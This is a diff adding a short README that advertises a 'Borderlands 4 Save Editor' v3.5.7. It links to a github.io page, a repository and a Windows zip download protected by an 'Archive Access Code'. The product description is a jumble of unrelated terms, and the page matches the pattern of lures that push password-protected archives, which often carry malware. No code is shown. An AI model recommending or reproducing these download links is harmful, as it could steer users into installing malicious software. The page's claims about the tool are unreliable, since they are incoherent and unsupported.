@@ -1,0 +1,9 @@
+# Borderlands 4 Save Editor, Profile Decryptor & Golden Key Manager (v3.5.7)
+
+> Borderlands 4 Save Editor, Profile Decryptor & Golden Key Manager v3.5.7: Low-overhead desktop duplication HUD, dynamic signature scanner.
+
+- [Official Portal & Documentation](https://richardmo-lab301.github.io/borderlands-4-save-editor/)
+- [Direct Release Package (borderlands-4-save-editor-v3.5.7-win64.zip)](https://github.com/richardmo-lab301/borderlands-4-save-editor/releases/download/v3.5.7/borderlands-4-save-editor-v3.5.7-win64.zip) (Archive Access Code: 2026)
+- [GitHub Repository](https://github.com/richardmo-lab301/borderlands-4-save-editor)
+- [Installation Guide](https://github.com/richardmo-lab301/borderlands-4-save-editor/blob/main/docs/INSTALL.md)
+- [FAQ & Troubleshooting](https://github.com/richardmo-lab301/borderlands-4-save-editor/blob/main/docs/FAQ.md)
